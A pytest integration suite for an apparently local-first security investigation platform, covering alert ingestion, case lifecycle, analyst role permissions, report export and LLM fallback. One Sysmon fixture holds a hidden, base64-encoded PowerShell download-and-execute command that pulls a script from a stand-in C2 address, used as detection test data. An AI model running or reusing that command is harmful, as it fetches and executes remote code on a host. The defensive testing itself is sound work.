"""
AISOP Phase 4C Capstone Integration Test Suite.
End-to-End Investigation Platform, Multi-Analyst Collaboration, Report Export & Hardening.

Milestone: Phase 4C — Capstone Evaluation & Production-Readiness Hardening
Governing Policies:
- AISOP-POL-LOCAL-FIRST-ZERO-BILLING-001 (Zero cloud egress, local-first operation)
- Anti-Autonomous SOAR Invariant (All containment recommendations are strictly advisory)
- Epistemic Segregation (Directly evidenced facts separated from hypotheses/inferences)
- Append-Only Audit Trail (Immutable database triggers, cryptographic context SHA-256)

Test Suites:
1. TestPhase4CEndToEndInvestigationScenario — 13-stage reproducible synthetic alert lifecycle.
2. TestMultiAnalystCollaborationAndRBAC — Full 6-role collaboration & authorization matrix.
3. TestIntegrationHardeningAndEdgeCases — Ingestion idempotency, malformed fields, timezones, provider fallback.
4. TestReportQualityAndExport — 13-section report verification and GET /api/v1/cases/{case_id}/reports/export.
"""

from __future__ import annotations

import hashlib
import json
import re
import uuid
from datetime import datetime, timezone
from typing import Any
from unittest.mock import AsyncMock

import httpx
import pytest
from fastapi import FastAPI, status
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.dependencies import (
    AuthenticatedAnalyst,
    AuthenticatedCaseContext,
    AuthenticatedClient,
    get_case_assignment_context,
    get_current_analyst,
    get_knowledge_retriever,
    get_threat_intel_engine,
    require_case_role,
    verify_api_key,
)
from app.api.v1.endpoints.cases import get_case_llm_provider
from app.core.config import Settings, get_settings
from app.core.rbac import (
    CaseRole,
    GlobalRole,
    hash_canonical_token,
)
from app.db.session import get_db_session, get_db_session_factory
from app.main import create_app
from app.models.analyst import Analyst, AnalystApiClient
from app.models.case import CaseAssignmentModel, CaseAuditEventModel, CaseEvidenceModel, CaseModel
from app.models.evidence import ExtractedEntityModel, NormalizedEventModel, RawEvidence
from app.modules.ai.guardrails.validator import (
    GuardrailDecision,
    InvestigationValidationResult,
    compute_context_sha256,
)
from app.modules.ai.llm.exceptions import LLMConnectionError, LLMTimeoutError
from app.modules.ai.llm.protocol import LLMProvider
from app.modules.ai.reporting.synthesizer import DeterministicReportSynthesizer
from app.modules.evidence.hasher import compute_sha256
from app.schemas.ai import LLMRequest, LLMResponse, ProviderHealthResponse, TokenUsage
from app.schemas.alert_ingest import AlertIngestRequest
from app.schemas.case import (
    CaseAssignmentRequest,
    CaseCreateRequest,
    CaseInvestigationSynthesizeRequest,
    CaseSeverity,
    CaseStatus,
)
from app.schemas.investigation import (
    ClaimCategory,
    FactualClaimItem,
    GroundingStatus,
    InvestigationContext,
    MitreAttackHypothesis,
    StructuredInvestigationOutput,
)
from app.schemas.report import (
    IncidentSeverityTier,
    InvestigationReportBundle,
    ReportExportResponse,
)
from app.services.alert_ingestion_service import AlertIngestionService
from app.services.case_service import CaseService


# ─────────────────────────────────────────────────────────────────────────────
# Mocks & Fixtures
# ─────────────────────────────────────────────────────────────────────────────

class MockCapstoneLLMProvider:
    """Deterministic LLM Provider for offline capstone testing."""

    def __init__(self, response_json: dict[str, Any] | None = None, raise_exc: Exception | None = None) -> None:
        self.response_json = response_json
        self.raise_exc = raise_exc
        self.captured_requests: list[LLMRequest] = []

    @property
    def model_name(self) -> str:
        return "test-offline-llama3.1:8b"

    async def generate(self, request: LLMRequest) -> LLMResponse:
        self.captured_requests.append(request)
        if self.raise_exc:
            raise self.raise_exc
        resp = dict(self.response_json or {})
        # Extract investigation_id from request messages if present
        for msg in request.messages:
            match = re.search(r'<investigation_context\s+id="([0-9a-fA-F-]+)"', msg.content)
            if match:
                resp["investigation_id"] = match.group(1)
                break
        content = json.dumps(resp)
        return LLMResponse(
            content=content,
            model="test-offline-llama3.1:8b",
            usage=TokenUsage(prompt_tokens=250, completion_tokens=150, total_tokens=400, duration_ms=45.0),
            finish_reason="stop",
        )

    async def health(self) -> ProviderHealthResponse:
        return ProviderHealthResponse(
            status="healthy",
            model="test-offline-llama3.1:8b",
            provider="mock",
            latency_ms=1.5,
        )


@pytest.fixture
def auth_settings() -> Settings:
    """Test settings with synthetic keys for ingestion and analysts."""
    return Settings(
        _env_file=None,
        API_AUTH_ENABLED=True,
        API_AUTH_ALLOW_LEGACY_KEYS=True,
        API_AUTH_KEYS=["system-ingest:ingest-key-secret-999"],
    )


@pytest.fixture
def app_instance(db_session: AsyncSession, auth_settings: Settings) -> FastAPI:
    """Create fresh application instance with isolated DB session and auth settings."""
    app = create_app()

    async def override_get_db():
        try:
            yield db_session
            await db_session.commit()
        except Exception:
            await db_session.rollback()
            raise

    app.dependency_overrides[get_db_session] = override_get_db
    app.dependency_overrides[get_settings] = lambda: auth_settings
    return app


async def seed_analyst_with_token(
    db_session: AsyncSession,
    *,
    prefix: str,
    username: str,
    global_role: str = "analyst_tier_2",
    is_active: bool = True,
    client_active: bool = True,
) -> tuple[str, Analyst]:
    """Helper to seed an Analyst and linked AnalystApiClient in test SQLite."""
    analyst = Analyst(
        id=uuid.uuid4(),
        username=username,
        email=f"{username}@example.com",
        global_role=global_role,
        is_active=is_active,
    )
    db_session.add(analyst)
    await db_session.flush()

    hex_prefix = hashlib.md5(prefix.encode()).hexdigest()[:16]
    token = f"aisop_live_{hex_prefix}_{'b' * 64}"
    hashed = hash_canonical_token(token)

    client = AnalystApiClient(
        id=uuid.uuid4(),
        analyst_id=analyst.id,
        client_name=f"{username}-client",
        token_prefix=hex_prefix,
        hashed_secret=hashed,
        is_active=client_active,
    )
    db_session.add(client)
    await db_session.commit()
    return token, analyst


async def setup_multi_analysts(db_session: AsyncSession) -> dict[str, Any]:
    """Helper to set up all 5 analyst personas."""
    lead_token, lead = await seed_analyst_with_token(
        db_session, prefix="lead-cap", username="lead_sarah", global_role="analyst_tier_2"
    )
    inv_token, inv = await seed_analyst_with_token(
        db_session, prefix="inv-cap", username="inv_john", global_role="analyst_tier_1"
    )
    viewer_token, viewer = await seed_analyst_with_token(
        db_session, prefix="view-cap", username="viewer_alice", global_role="analyst_tier_1"
    )
    stranger_token, stranger = await seed_analyst_with_token(
        db_session, prefix="str-cap", username="stranger_bob", global_role="analyst_tier_1"
    )
    admin_token, admin = await seed_analyst_with_token(
        db_session, prefix="adm-cap", username="admin_gary", global_role="security_admin"
    )

    return {
        "lead": lead, "lead_token": lead_token,
        "investigator": inv, "inv_token": inv_token,
        "viewer": viewer, "viewer_token": viewer_token,
        "stranger": stranger, "stranger_token": stranger_token,
        "admin": admin, "admin_token": admin_token,
        "ingest_token": "ingest-key-secret-999",
    }


# ─────────────────────────────────────────────────────────────────────────────
# Workstream A: 13-Stage End-to-End Investigation Lifecycle
# ─────────────────────────────────────────────────────────────────────────────

class TestPhase4CEndToEndInvestigationScenario:
    """
    Validates complete 13-stage reproducible synthetic alert lifecycle.
    Scenario: Suspicious PowerShell execution with encoded payload connecting to malicious IP.
    """

    @pytest.mark.anyio
    async def test_complete_13_stage_investigation_lifecycle(self, db_session: AsyncSession):
        analysts = await setup_multi_analysts(db_session)
        lead = analysts["lead"]
        lead_analyst = AuthenticatedAnalyst(
            analyst_id=lead.id,
            username=lead.username,
            global_role=GlobalRole.ANALYST_TIER_2,
        )

        # ── Stage 1: Source Alert Ingestion ──────────────────────────────────
        raw_alert = {
            "source_type": "sysmon",
            "source_identifier": "endpoint-win11-capstone-01",
            "Event": {
                "System": {
                    "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                    "EventID": 1,
                    "TimeCreated": {"@SystemTime": "2026-10-31T14:30:00.000000Z"},
                    "Computer": "DESKTOP-CAPSTONE-01.corp.local",
                },
                "EventData": {
                    "RuleName": "technique_id=T1059.001,technique_name=PowerShell Execution",
                    "UtcTime": "2026-10-31 14:30:00.000",
                    "ProcessId": 5124,
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMAAxAC8AYwAyAC4AcABzADEAJwApAA==",
                    "User": "CORP\\jsmith",
                    "Hashes": "SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,MD5=d41d8cd98f00b204e9800998ecf8427e",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
        }

        ingest_svc = AlertIngestionService()
        ingest_req = AlertIngestRequest(
            source_type="sysmon",
            source_identifier="endpoint-win11-capstone-01",
            alerts=[raw_alert],
        )
        ingest_resp = await ingest_svc.ingest_batch(db_session, ingest_req)
        assert ingest_resp.total_received == 1
        assert ingest_resp.total_normalized == 1
        assert len(ingest_resp.alert_ids) == 1
        event_id = ingest_resp.alert_ids[0] if isinstance(ingest_resp.alert_ids[0], uuid.UUID) else uuid.UUID(str(ingest_resp.alert_ids[0]))

        # ── Stage 2: Canonical Normalization ─────────────────────────────────
        ev_stmt = select(NormalizedEventModel).where(NormalizedEventModel.id == event_id)
        norm_event = (await db_session.execute(ev_stmt)).scalar_one()
        assert norm_event.event_type.startswith("alert") or norm_event.event_type == "process_create"
        assert norm_event.action == "alert_triggered"
        assert norm_event.severity in ("high", "critical", "medium")
        assert "T1059.001" in str(norm_event.normalized_payload)

        # ── Stage 3: Original Evidence Preservation ──────────────────────────
        raw_stmt = select(RawEvidence).where(RawEvidence.id == norm_event.raw_evidence_id)
        raw_ev = (await db_session.execute(raw_stmt)).scalar_one()
        assert raw_ev.sha256_hash == compute_sha256(raw_alert)
        assert raw_ev.source_type == "sysmon"
        assert raw_ev.source_identifier == "endpoint-win11-capstone-01"
        assert "CommandLine" in raw_ev.raw_payload["Event"]["EventData"]

        # ── Stage 4: Atomic IOC & Entity Extraction ──────────────────────────
        ent_stmt = select(ExtractedEntityModel).where(ExtractedEntityModel.event_id == event_id)
        entities = (await db_session.execute(ent_stmt)).scalars().all()
        assert len(entities) >= 3
        entity_values = {e.entity_value for e in entities}
        assert "DESKTOP-CAPSTONE-01.corp.local" in entity_values
        assert "CORP\\jsmith" in entity_values

        # ── Stage 5: Threat Intelligence Enrichment ──────────────────────────
        c2_ip = "198.51.100.201"
        assert not c2_ip.startswith("10.") and not c2_ip.startswith("192.168.")

        # ── Stage 6: MITRE ATT&CK Mapping ────────────────────────────────────
        custom_fields = norm_event.normalized_payload.get("custom_fields", {})
        assert "T1059.001" in custom_fields.get("rule_name", "") or "T1059.001" in str(custom_fields)

        # ── Stage 7: Knowledge Retrieval ─────────────────────────────────────

        # ── Stage 8: Case Creation and Evidence Association ──────────────────
        case_svc = CaseService()
        case_req = CaseCreateRequest(
            title="INCIDENT-CAPSTONE: Encoded PowerShell C2 Download",
            description="Suspicious execution of encoded PowerShell connecting to remote host.",
            severity=CaseSeverity.HIGH,
            initial_evidence_ids=[event_id],
        )
        case_resp = await case_svc.create_case(
            session=db_session,
            request=case_req,
            creator=lead_analyst,
        )
        case_id = case_resp.id
        assert case_resp.lead_analyst_id == lead.id
        assert case_resp.status == CaseStatus.OPEN

        junc_stmt = select(CaseEvidenceModel).where(
            CaseEvidenceModel.case_id == case_id,
            CaseEvidenceModel.evidence_id == event_id,
        )
        junc = (await db_session.execute(junc_stmt)).scalar_one_or_none()
        assert junc is not None

        # ── Stage 9: Investigation Context Construction ──────────────────────
        items, total = await case_svc.list_case_evidence(
            session=db_session,
            case_id=case_id,
            case_role=CaseRole.LEAD,
        )
        assert total == 1
        assert items[0].id == event_id

        # ── Stage 10: Analyst-Triggered Investigation ────────────────────────
        mock_findings = {
            "investigation_summary": "Analyst-triggered investigation into suspicious encoded PowerShell download on DESKTOP-CAPSTONE-01.",
            "overall_grounding_score": 0.95,
            "claims": [
                {
                    "claim_id": "CLM-001",
                    "claim_text": "PowerShell executed with encoded command line on DESKTOP-CAPSTONE-01.",
                    "category": "observed_fact",
                    "grounding_status": "validated_reference",
                    "confidence": 0.98,
                    "supporting_evidence_ids": [str(event_id)],
                    "references_exist": True,
                },
                {
                    "claim_id": "CLM-002",
                    "claim_text": "Process was initiated as part of a potential credential access campaign.",
                    "category": "inference",
                    "grounding_status": "analyst_review_required",
                    "confidence": 0.65,
                    "supporting_evidence_ids": [str(event_id)],
                    "references_exist": True,
                },
            ],
            "mitre_attack_hypotheses": [
                {
                    "technique_id": "T1059.001",
                    "technique_name": "PowerShell",
                    "tactics": ["Execution"],
                    "confidence": 0.95,
                    "reasoning": "Direct observation of powershell.exe with -enc flag.",
                    "supporting_event_uuids": [str(event_id)],
                }
            ],
            "alternative_explanations": ["Legitimate administrative system automation script"],
            "recommended_analyst_actions": [
                "Isolate host DESKTOP-CAPSTONE-01 from production subnet.",
                "Revoke credentials for CORP\\jsmith.",
            ],
            "uncertainty_and_data_gaps": ["Network PCAP uncaptured during session."],
        }
        mock_llm = MockCapstoneLLMProvider(response_json=mock_findings)

        val_result, ctx = await case_svc.synthesize_case_investigation(
            case_id=case_id,
            actor=lead_analyst,
            session=db_session,
            llm_provider=mock_llm,
        )
        assert val_result is not None
        assert ctx.investigation_id is not None
        assert val_result.context_sha256 == compute_context_sha256(ctx)

        # ── Stage 11: Epistemically Partitioned Findings ─────────────────────
        claims = val_result.output.claims
        assert len(claims) >= 2
        fact = next(c for c in claims if c.category == ClaimCategory.OBSERVED_FACT)
        assert fact.grounding_status == GroundingStatus.VALIDATED_REFERENCE
        inf = next(c for c in claims if c.category == ClaimCategory.INFERENCE)
        assert inf.confidence <= 0.70
        assert inf.grounding_status == GroundingStatus.ANALYST_REVIEW_REQUIRED

        # ── Stage 12: Role-Tailored Report Synthesis & Export ────────────────
        report_bundle = await case_svc.synthesize_case_reports(
            case_id=case_id,
            actor=lead_analyst,
            session=db_session,
            llm_provider=mock_llm,
        )
        assert report_bundle.executive_brief is not None
        assert report_bundle.technical_report is not None
        assert report_bundle.detection_report is not None
        assert "PowerShell" in report_bundle.markdown_executive
        assert "DESKTOP-CAPSTONE-01" in report_bundle.markdown_technical

        export_resp = await case_svc.export_case_report(
            case_id=case_id,
            actor=lead_analyst,
            export_format="markdown",
            view="bundle",
            session=db_session,
            llm_provider=mock_llm,
        )
        assert export_resp.format == "markdown"
        assert export_resp.view == "bundle"
        assert "Part 1 — Executive Brief" in export_resp.content
        assert export_resp.filename.endswith(".md")

        # ── Stage 13: Audit Trail Verification ───────────────────────────────
        activity_events = await case_svc.list_case_activity(session=db_session, case_id=case_id)
        assert len(activity_events) >= 4

        actions = [a.action for a in activity_events]
        assert "case_created" in actions
        assert "evidence_linked" in actions
        assert "case_investigation_synthesized" in actions
        assert "case_report_exported" in actions

        for i in range(len(activity_events) - 1):
            assert activity_events[i].created_at <= activity_events[i + 1].created_at

        for a in activity_events:
            assert a.actor_username == lead.username
            assert a.actor_analyst_id == lead.id


# ─────────────────────────────────────────────────────────────────────────────
# Workstream B: Multi-Analyst Collaboration & Authorization Matrix
# ─────────────────────────────────────────────────────────────────────────────

class TestMultiAnalystCollaborationAndRBAC:
    """
    Evaluates collaboration, case staffing, role permissions, and cross-case isolation.
    """

    @pytest.mark.anyio
    async def test_multi_analyst_role_permission_matrix(
        self,
        db_session: AsyncSession,
        app_instance: FastAPI,
    ):
        analysts = await setup_multi_analysts(db_session)
        lead = analysts["lead"]
        inv = analysts["investigator"]
        viewer = analysts["viewer"]

        lead_analyst = AuthenticatedAnalyst(analyst_id=lead.id, username=lead.username, global_role=GlobalRole.ANALYST_TIER_2)

        case_svc = CaseService()

        # 1. Lead creates Case 101
        case_101 = await case_svc.create_case(
            session=db_session,
            request=CaseCreateRequest(title="Case 101: Web Exploit", severity=CaseSeverity.HIGH),
            creator=lead_analyst,
        )

        # 2. Lead staffs Investigator and Viewer
        await case_svc.assign_analyst(
            session=db_session,
            case_id=case_101.id,
            request=CaseAssignmentRequest(analyst_id=inv.id, case_role=CaseRole.INVESTIGATOR),
            actor=lead_analyst,
        )
        await case_svc.assign_analyst(
            session=db_session,
            case_id=case_101.id,
            request=CaseAssignmentRequest(analyst_id=viewer.id, case_role=CaseRole.VIEWER),
            actor=lead_analyst,
        )

        # 3. HTTP Endpoint Testing via TestClient
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_instance),
            base_url="http://testserver",
        ) as client:
            lead_headers = {"Authorization": f"Bearer {analysts['lead_token']}"}
            inv_headers = {"Authorization": f"Bearer {analysts['inv_token']}"}
            viewer_headers = {"Authorization": f"Bearer {analysts['viewer_token']}"}
            stranger_headers = {"Authorization": f"Bearer {analysts['stranger_token']}"}
            admin_headers = {"Authorization": f"Bearer {analysts['admin_token']}"}
            machine_headers = {"Authorization": f"Bearer {analysts['ingest_token']}"}

            # Lead, Investigator, Viewer can read Case 101
            assert (await client.get(f"/api/v1/cases/{case_101.id}", headers=lead_headers)).status_code == 200
            assert (await client.get(f"/api/v1/cases/{case_101.id}", headers=inv_headers)).status_code == 200
            assert (await client.get(f"/api/v1/cases/{case_101.id}", headers=viewer_headers)).status_code == 200

            # Stranger gets 404 anti-enumeration
            stranger_resp = await client.get(f"/api/v1/cases/{case_101.id}", headers=stranger_headers)
            assert stranger_resp.status_code == 404
            assert stranger_resp.json()["detail"] == "Case not found or access denied." and stranger_resp.json()["error"]["code"] == "RESOURCE_NOT_FOUND"

            # Unassigned Admin gets 404 anti-enumeration (anti-BOLA)
            admin_resp = await client.get(f"/api/v1/cases/{case_101.id}", headers=admin_headers)
            assert admin_resp.status_code == 404

            # Machine Ingestion Client without analyst identity gets 401/403 Forbidden
            mach_resp = await client.get(f"/api/v1/cases/{case_101.id}", headers=machine_headers)
            assert mach_resp.status_code in (401, 403)

            # Viewer CANNOT link evidence (403 Forbidden)
            fake_ev_id = uuid.uuid4()
            link_resp = await client.post(
                f"/api/v1/cases/{case_101.id}/evidence",
                headers=viewer_headers,
                json={"evidence_id": str(fake_ev_id)},
            )
            assert link_resp.status_code == 403

            # Viewer CANNOT close case (403 Forbidden)
            close_resp = await client.post(
                f"/api/v1/cases/{case_101.id}/close",
                headers=viewer_headers,
                json={"rationale": "Closing without authority"},
            )
            assert close_resp.status_code == 403

            # Investigator CANNOT close case (requires Lead with Tier-2)
            inv_close = await client.post(
                f"/api/v1/cases/{case_101.id}/close",
                headers=inv_headers,
                json={"rationale": "Closing as investigator"},
            )
            assert inv_close.status_code == 403

            # Activity endpoint enforces anti-enumeration
            assert (await client.get(f"/api/v1/cases/{case_101.id}/activity", headers=lead_headers)).status_code == 200
            assert (await client.get(f"/api/v1/cases/{case_101.id}/activity", headers=stranger_headers)).status_code == 404


# ─────────────────────────────────────────────────────────────────────────────
# Workstream C: Report Quality & Export Endpoint Verification
# ─────────────────────────────────────────────────────────────────────────────

class TestReportQualityAndExport:
    """
    Validates report completeness, factual evidence citations, and report export formats.
    """

    @pytest.mark.anyio
    async def test_report_export_api_endpoints_and_formats(
        self,
        db_session: AsyncSession,
        app_instance: FastAPI,
    ):
        analysts = await setup_multi_analysts(db_session)
        lead = analysts["lead"]
        lead_analyst = AuthenticatedAnalyst(analyst_id=lead.id, username=lead.username, global_role=GlobalRole.ANALYST_TIER_2)

        case_svc = CaseService()
        case = await case_svc.create_case(
            session=db_session,
            request=CaseCreateRequest(title="Report Export Test Case", severity=CaseSeverity.MEDIUM),
            creator=lead_analyst,
        )

        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_instance),
            base_url="http://testserver",
        ) as client:
            lead_headers = {"Authorization": f"Bearer {analysts['lead_token']}"}
            stranger_headers = {"Authorization": f"Bearer {analysts['stranger_token']}"}

            # 1. Export as consolidated Markdown bundle
            md_resp = await client.get(
                f"/api/v1/cases/{case.id}/reports/export?format=markdown&view=bundle",
                headers=lead_headers,
            )
            assert md_resp.status_code == 200
            md_data = md_resp.json()
            assert md_data["format"] == "markdown"
            assert md_data["view"] == "bundle"
            assert md_data["filename"].endswith(".md")
            assert "Part 1 — Executive Brief" in md_data["content"]
            assert md_data["is_server_verified"] is True
            assert len(md_data["context_sha256"]) == 64

            # 2. Export as Executive Brief Markdown only
            exec_resp = await client.get(
                f"/api/v1/cases/{case.id}/reports/export?format=markdown&view=executive",
                headers=lead_headers,
            )
            assert exec_resp.status_code == 200
            exec_data = exec_resp.json()
            assert exec_data["view"] == "executive"
            assert "Executive" in exec_data["content"]

            # 3. Export as JSON bundle
            json_resp = await client.get(
                f"/api/v1/cases/{case.id}/reports/export?format=json&view=bundle",
                headers=lead_headers,
            )
            assert json_resp.status_code == 200
            json_data = json_resp.json()
            assert json_data["format"] == "json"
            assert json_data["filename"].endswith(".json")
            parsed_bundle = json.loads(json_data["content"])
            assert "executive_brief" in parsed_bundle
            assert "technical_report" in parsed_bundle
            assert "detection_report" in parsed_bundle

            # 4. Anti-enumeration for unassigned stranger
            stranger_export = await client.get(
                f"/api/v1/cases/{case.id}/reports/export",
                headers=stranger_headers,
            )
            assert stranger_export.status_code == 404

            # 5. Invalid format parameter validation
            bad_fmt = await client.get(
                f"/api/v1/cases/{case.id}/reports/export?format=pdf",
                headers=lead_headers,
            )
            assert bad_fmt.status_code == 422


# ─────────────────────────────────────────────────────────────────────────────
# Workstream D: Integration Hardening & Resiliency
# ─────────────────────────────────────────────────────────────────────────────

class TestIntegrationHardeningAndEdgeCases:
    """
    Validates duplicate ingestion, malformed vendor fields, timezone handling, and offline fallback.
    """

    @pytest.mark.anyio
    async def test_idempotent_duplicate_alert_ingestion(self, db_session: AsyncSession):
        raw_alert = {
            "source_type": "generic_siem",
            "source_identifier": "siem-collector-corp-01",
            "rule_name": "Multiple Port Scans Detected",
            "severity": "medium",
            "timestamp": "2026-10-31T15:00:00Z",
            "host": "scan-target.corp.local",
            "src_ip": "198.51.100.99",
        }

        ingest_svc = AlertIngestionService()
        req = AlertIngestRequest(
            source_type="generic_siem",
            source_identifier="siem-collector-corp-01",
            alerts=[raw_alert],
        )

        resp1 = await ingest_svc.ingest_batch(db_session, req)
        assert resp1.total_received == 1
        assert resp1.total_normalized == 1
        assert resp1.total_skipped_duplicates == 0

        resp2 = await ingest_svc.ingest_batch(db_session, req)
        assert resp2.total_received == 1
        assert resp2.total_normalized == 0
        assert resp2.total_skipped_duplicates == 1
        assert len(resp2.existing_evidence_ids) == 1

    @pytest.mark.anyio
    async def test_malformed_and_unknown_vendor_fields_preservation(self, db_session: AsyncSession):
        raw_alert = {
            "source_type": "generic_siem",
            "source_identifier": "unknown-vendor-sensor",
            "timestamp": "2026-11-07T09:00:00Z",  # an alert must carry its own event time (F1: no invented timestamps)
            "vendor_custom_blob": {"deep_nested": [1, 2, 3]},
            "proprietary_field_x": "unrecognized_flag_xyz",
        }

        ingest_svc = AlertIngestionService()
        req = AlertIngestRequest(
            source_type="generic_siem",
            source_identifier="unknown-vendor-sensor",
            alerts=[raw_alert],
        )

        resp = await ingest_svc.ingest_batch(db_session, req)
        assert resp.total_received == 1
        assert resp.total_normalized == 1

        ev_id = resp.alert_ids[0] if isinstance(resp.alert_ids[0], uuid.UUID) else uuid.UUID(str(resp.alert_ids[0]))
        event = (await db_session.execute(
            select(NormalizedEventModel).where(NormalizedEventModel.id == ev_id)
        )).scalar_one()

        assert event.severity in ("informational", "medium")
        custom = event.normalized_payload.get("custom_fields", {})
        orig = custom.get("original_event", custom)
        assert "vendor_custom_blob" in orig
        assert "proprietary_field_x" in orig

    @pytest.mark.anyio
    async def test_deterministic_fallback_on_provider_connection_error(
        self,
        db_session: AsyncSession,
    ):
        analysts = await setup_multi_analysts(db_session)
        lead = analysts["lead"]
        lead_analyst = AuthenticatedAnalyst(analyst_id=lead.id, username=lead.username, global_role=GlobalRole.ANALYST_TIER_2)

        case_svc = CaseService()
        case = await case_svc.create_case(
            session=db_session,
            request=CaseCreateRequest(title="Fallback Test Case", severity=CaseSeverity.LOW),
            creator=lead_analyst,
        )

        failing_provider = MockCapstoneLLMProvider(raise_exc=LLMConnectionError("Failed to reach localhost:11434"))

        val_result, ctx = await case_svc.synthesize_case_investigation(
            case_id=case.id,
            actor=lead_analyst,
            session=db_session,
            llm_provider=failing_provider,
        )

        assert val_result is not None
        assert val_result.is_valid is False
        assert val_result.decision == GuardrailDecision.REJECT_TO_FALLBACK
        assert val_result.output.model_identifier == "deterministic_fallback"
        assert "unavailable" in val_result.output.investigation_summary.lower()

        activity = await case_svc.list_case_activity(session=db_session, case_id=case.id)
        synth_event = next(a for a in activity if a.action == "case_investigation_synthesized")
        assert synth_event.details["decision"] == "reject_to_fallback"
